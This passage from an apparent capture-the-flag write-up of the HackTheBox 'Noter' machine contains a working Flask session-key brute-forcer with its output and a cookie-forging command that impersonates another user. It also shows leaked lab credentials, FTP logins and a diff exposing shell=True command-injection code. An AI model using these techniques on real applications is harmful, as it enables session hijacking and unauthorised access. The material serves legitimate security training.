<h3 id="brute-forcing-secret-key-used-to-generate-cookies"><span class="me-2">Brute-forcing secret key used to generate cookies:</span><a href="#brute-forcing-secret-key-used-to-generate-cookies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li><a href="https://pypi.org/project/flask-cookie-decode/">flask-cookie-decode</a></li>
  <li><a href="https://github.com/noraj/flask-session-cookie-manager/tree/d1b17a66850eeeb710c63da762631d38ee3c8dda">GitHub - noraj/flask-session-cookie-manager at d1b17a66850eeeb710c63da762631d38ee3c8dda</a></li>
</ul>

<p><strong>bruteforce.py</strong></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
## standard imports
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">zlib</span>
<span class="kn">from</span> <span class="n">itsdangerous</span> <span class="kn">import</span> <span class="n">base64_decode</span>
<span class="kn">import</span> <span class="n">ast</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">from</span> <span class="n">abc</span> <span class="kn">import</span> <span class="n">ABC</span><span class="p">,</span> <span class="n">abstractmethod</span>

<span class="c1">## Lib for argument parsing
</span><span class="kn">import</span> <span class="n">argparse</span>
<span class="kn">import</span> <span class="n">itertools</span>

<span class="c1">## external Imports
</span><span class="kn">from</span> <span class="n">flask.sessions</span> <span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>

<span class="k">class</span> <span class="nc">MockApp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">secret_key</span>

<span class="k">class</span> <span class="nc">FSCM</span><span class="p">(</span><span class="n">ABC</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">session_cookie_value</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
        <span class="sh">"""</span><span class="s"> Decode a Flask cookie  </span><span class="sh">"""</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">app</span> <span class="o">=</span> <span class="nc">MockApp</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
            <span class="n">si</span> <span class="o">=</span> <span class="nc">SecureCookieSessionInterface</span><span class="p">()</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">si</span><span class="p">.</span><span class="nf">get_signing_serializer</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">session_cookie_value</span><span class="p">))</span>
            <span class="nf">exit</span><span class="p">()</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="sh">"</span><span class="s">[Decoding error] {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
            <span class="k">raise</span> <span class="n">e</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: bruteforce.py &lt;cookie&gt; &lt;wordlist&gt;</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="n">cookie</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">secret_key</span> <span class="o">=</span> <span class="sh">''</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Bruteforcing cookie </span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nb">file</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span><span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">w</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Testig secret_key </span><span class="si">{</span><span class="n">w</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">FSCM</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/exploit]
â””â”€<span class="nv">$ </span>python3 bruteforce.py <span class="s2">"eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU"</span> /usr/share/wordlists/rockyou.txt

Bruteforcing cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU
Testig secret_key 123456
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key 12345
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key 123456789
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key password
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
...
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key secret123
<span class="o">{</span><span class="s1">'logged_in'</span>: True, <span class="s1">'username'</span>: <span class="s1">'maoutis'</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Crafting an arbitrary cookie to impersonate <em>blue</em>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/Noter/exploit/flask-session-cookie-manager]
â””â”€<span class="nv">$ </span>python3 flask_session_cookie_manager3.py encode  <span class="nt">-s</span> <span class="s1">'secret123'</span> <span class="nt">-t</span> <span class="s2">"{'logged_in': True, 'username': 'blue'}"</span>
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Ynz37Q.bhsuepbK0pIPjT4j091foqoNesw
</pre></td></tr></tbody></table></code></div></div>
<p>New features for VIP users:</p>

<p><a href="/assets/img/Noter/Untitled%206.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%206.png" alt="New features for VIP users" loading="lazy"></a></p>

<p>Blue notes:</p>

<p><a href="/assets/img/Noter/Untitled%207.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%207.png" alt="blue notes" loading="lazy"></a></p>

<h4 id="enumerate-secret-notes"><span class="me-2">Enumerate secret notes</span><a href="#enumerate-secret-notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p><a href="/assets/img/Noter/Untitled%208.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>

<aside>
ðŸ”‘ blue     blue@Noter!

</aside>

<p><a href="/assets/img/Noter/Untitled%209.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>

<h4 id="accessed-ftp-using-leaked-credentials"><span class="me-2">Accessed FTP using leaked credentials</span><a href="#accessed-ftp-using-leaked-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/Noter/exploit/flask-session-cookie-manager]
â””â”€<span class="nv">$ </span>ftp noter.htb
Connected to noter.htb.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>noter.htb:maoutis<span class="o">)</span>: blue
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
<span class="nt">-rw-r--r--</span>    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.
ftp&gt; get policy.pdf
</pre></td></tr></tbody></table></code></div></div>

<p><strong>policy.pdf</strong></p>

<p><a href="/assets/img/Noter/Untitled%2010.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>

<ul>
  <li>
    <p>Tried to access SSH using noter credentials (not working)</p>

    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre>  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>ssh blue@noter.htb
  blue@noter.htb<span class="s1">'s password:
  Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
    
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
    
   System information disabled due to load higher than 2.0
    
   * Super-optimized for small spaces - read how we shrank the memory
     footprint of MicroK8s to make it the smallest full K8s around.
    
     https://ubuntu.com/blog/microk8s-memory-optimisation
    
  157 updates can be applied immediately.
  112 of these updates are standard security updates.
  To see these additional updates run: apt list --upgradable
    
  The list of available updates is more than a week old.
  To check for new updates run: sudo apt update
    
  The programs included with the Ubuntu system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
    
  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  applicable law.
    
  The programs included with the Ubuntu system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
    
  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  applicable law.
    
  This account is currently not available.
  Connection to noter.htb closed.
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Tried to access FTP guessing ftp_admin credentials</p>

    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>ftp noter.htb
  Connected to noter.htb.
  220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
  Name <span class="o">(</span>noter.htb:maoutis<span class="o">)</span>: ftp_admin
  331 Please specify the password.
  Password:
  230 Login successful.
  Remote system <span class="nb">type </span>is UNIX.
  Using binary mode to transfer files.
  ftp&gt; <span class="nb">ls
  </span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
  150 Here comes the directory listing.
  <span class="nt">-rw-r--r--</span>    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
  <span class="nt">-rw-r--r--</span>    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
  226 Directory send OK.
  ftp&gt; get app_backup_1635803546.zip
  <span class="nb">local</span>: app_backup_1635803546.zip remote: app_backup_1635803546.zip
  200 PORT <span class="nb">command </span>successful. Consider using PASV.
  150 Opening BINARY mode data connection <span class="k">for </span>app_backup_1635803546.zip <span class="o">(</span>25559 bytes<span class="o">)</span><span class="nb">.</span>
  226 Transfer complete.
  25559 bytes received <span class="k">in </span>0.04 secs <span class="o">(</span>667.0219 kB/s<span class="o">)</span>
  ftp&gt; get app_backup_1638395546.zip
  <span class="nb">local</span>: app_backup_1638395546.zip remote: app_backup_1638395546.zip
  200 PORT <span class="nb">command </span>successful. Consider using PASV.
  150 Opening BINARY mode data connection <span class="k">for </span>app_backup_1638395546.zip <span class="o">(</span>26298 bytes<span class="o">)</span><span class="nb">.</span>
  226 Transfer complete.
  26298 bytes received <span class="k">in </span>0.04 secs <span class="o">(</span>697.8327 kB/s<span class="o">)</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Enumerated differences between the two zip files:</p>

    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
</pre></td><td class="rouge-code"><pre>  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>diff app_backup_1635803546 app_backup_1638395546 <span class="nt">-q</span> <span class="nt">-r</span>
  Only <span class="k">in </span>app_backup_1635803546: app_backup_1635803546.zip
  Only <span class="k">in </span>app_backup_1638395546: app_backup_1638395546.zip
  Files app_backup_1635803546/app.py and app_backup_1638395546/app.py differ
    
  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>diff app_backup_1635803546/app.py app_backup_1638395546/app.py <span class="nt">-y</span> <span class="nt">--suppress-common-lines</span> <span class="nt">-t</span>                                                                                                                                         1 â¨¯
  app.config[<span class="s1">'MYSQL_USER'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'root'</span>                               |  app.config[<span class="s1">'MYSQL_USER'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'DB_user'</span>
  app.config[<span class="s1">'MYSQL_PASSWORD'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'Nildogg36'</span>                      |  app.config[<span class="s1">'MYSQL_PASSWORD'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'DB_password'</span>
                                                                  <span class="o">&gt;</span>  attachment_dir <span class="o">=</span> <span class="s1">'misc/attachments/'</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c">## Export notes</span>
                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/export_note'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'GET'</span>, <span class="s1">'POST'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def export_note<span class="o">()</span>:
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>          try:
                                                                  <span class="o">&gt;</span>              cur <span class="o">=</span> mysql.connection.cursor<span class="o">()</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              <span class="c">## Get note</span>
                                                                  <span class="o">&gt;</span>              result <span class="o">=</span> cur.execute<span class="o">(</span><span class="s2">"SELECT * FROM notes WHERE aut
                                                                  &gt;
                                                                  &gt;              notes = cur.fetchall()
                                                                  &gt;
                                                                  &gt;              if result &gt; 0:
                                                                  &gt;                  return render_template('export_note.html', note
                                                                  &gt;              else:
                                                                  &gt;                  msg = 'No notes Found'
                                                                  &gt;                  return render_template('export_note.html', msg=
                                                                  &gt;              ## Close connection
                                                                  &gt;              cur.close()
                                                                  &gt;
                                                                  &gt;          except Exception as e:
                                                                  &gt;              return render_template('export_note.html', error="</span>A
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>      <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>          abort<span class="o">(</span>403<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c">## Export local</span>
                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/export_note_local/&lt;string:id&gt;'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'GET'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def export_note_local<span class="o">(</span><span class="nb">id</span><span class="o">)</span>:
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          cur <span class="o">=</span> mysql.connection.cursor<span class="o">()</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          result <span class="o">=</span> cur.execute<span class="o">(</span><span class="s2">"SELECT * FROM notes WHERE id = %s
                                                                  &gt;
                                                                  &gt;          if result &gt; 0:
                                                                  &gt;              note = cur.fetchone()
                                                                  &gt;
                                                                  &gt;              rand_int = random.randint(1,10000)
                                                                  &gt;              command = f"</span>node misc/md-to-pdf.js  <span class="s1">$'{note['</span>body<span class="s1">']
                                                                  &gt;              subprocess.run(command, shell=True, executable="/bi
                                                                  &gt;
                                                                  &gt;              return send_file(attachment_dir + str(rand_int) +'</span><span class="nb">.</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>              <span class="k">return </span>render_template<span class="o">(</span><span class="s1">'dashboard.html'</span><span class="o">)</span>
                                                                  <span class="o">&gt;</span>      <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>          abort<span class="o">(</span>403<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c">## Export remote</span>
                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/export_note_remote'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'POST'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def export_note_remote<span class="o">()</span>:
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>          try:
                                                                  <span class="o">&gt;</span>              url <span class="o">=</span> request.form[<span class="s1">'url'</span><span class="o">]</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              status, error <span class="o">=</span> parse_url<span class="o">(</span>url<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              <span class="k">if</span> <span class="o">(</span>status is True<span class="o">)</span> and <span class="o">(</span>error is None<span class="o">)</span>:
                                                                  <span class="o">&gt;</span>                  try:
                                                                  <span class="o">&gt;</span>                      r <span class="o">=</span> pyrequest.get<span class="o">(</span>url,allow_redirects<span class="o">=</span>True<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      rand_int <span class="o">=</span> random.randint<span class="o">(</span>1,10000<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      <span class="nb">command</span> <span class="o">=</span> f<span class="s2">"node misc/md-to-pdf.js  </span><span class="nv">$'</span><span class="s2">{r.te
                                                                  &gt;                      subprocess.run(command, shell=True, executa
                                                                  &gt;
                                                                  &gt;                      if os.path.isfile(attachment_dir + f'{str(r
                                                                  &gt;
                                                                  &gt;                          return send_file(attachment_dir + f'{st
                                                                  &gt;
                                                                  &gt;                      else:
                                                                  &gt;                          return render_template('export_note.htm
                                                                  &gt;
                                                                  &gt;                  except Exception as e:
                                                                  &gt;                      return render_template('export_note.html',
                                                                  &gt;
                                                                  &gt;
                                                                  &gt;              else:
                                                                  &gt;                  return render_template('export_note.html', erro
                                                                  &gt;
                                                                  &gt;          except Exception as e:
                                                                  &gt;              return render_template('export_note.html', error=f"</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>      <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>          abort<span class="o">(</span>403<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c">## Import notes</span>
                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/import_note'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'GET'</span>, <span class="s1">'POST'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def import_note<span class="o">()</span>:
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>          <span class="k">if </span>request.method <span class="o">==</span> <span class="s1">'GET'</span>:
                                                                  <span class="o">&gt;</span>              <span class="k">return </span>render_template<span class="o">(</span><span class="s1">'import_note.html'</span><span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          <span class="k">elif </span>request.method <span class="o">==</span> <span class="s2">"POST"</span>:
                                                                  <span class="o">&gt;</span>              title <span class="o">=</span> request.form[<span class="s1">'title'</span><span class="o">]</span>
                                                                  <span class="o">&gt;</span>              url <span class="o">=</span> request.form[<span class="s1">'url'</span><span class="o">]</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              status, error <span class="o">=</span> parse_url<span class="o">(</span>url<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              <span class="k">if</span> <span class="o">(</span>status is True<span class="o">)</span> and <span class="o">(</span>error is None<span class="o">)</span>:
                                                                  <span class="o">&gt;</span>                  try:
                                                                  <span class="o">&gt;</span>                      r <span class="o">=</span> pyrequest.get<span class="o">(</span>url,allow_redirects<span class="o">=</span>True<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      md <span class="o">=</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span>.join<span class="o">(</span>r.text.split<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)[</span>:]<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>                      body <span class="o">=</span> markdown.markdown<span class="o">(</span>md<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      cur <span class="o">=</span> mysql.connection.cursor<span class="o">()</span>
                                                                  <span class="o">&gt;</span>                      cur.execute<span class="o">(</span><span class="s2">"INSERT INTO notes(title, body,
                                                                  &gt;                      mysql.connection.commit()
                                                                  &gt;                      cur.close()
                                                                  &gt;
                                                                  &gt;                      return render_template('import_note.html',
                                                                  &gt;
                                                                  &gt;
                                                                  &gt;                  except Exception as e:
                                                                  &gt;                      return render_template('import_note.html',
                                                                  &gt;
                                                                  &gt;              else:
                                                                  &gt;                  return render_template('import_note.html', erro
                                                                  &gt;
                                                                  &gt;      else:
                                                                  &gt;          abort(403)
                                                                  &gt;
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Enumerated <strong>app.py</strong></p>

    <div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450
451
452
453
454
455
456
</pre></td><td class="rouge-code"><pre>  <span class="c1">#!/usr/bin/python3
</span>  <span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">logging</span><span class="p">,</span> <span class="n">send_file</span>
  <span class="kn">from</span> <span class="n">flask_mysqldb</span> <span class="kn">import</span> <span class="n">MySQL</span>
  <span class="kn">from</span> <span class="n">wtforms</span> <span class="kn">import</span> <span class="n">Form</span><span class="p">,</span> <span class="n">StringField</span><span class="p">,</span> <span class="n">TextAreaField</span><span class="p">,</span> <span class="n">PasswordField</span><span class="p">,</span> <span class="n">validators</span>
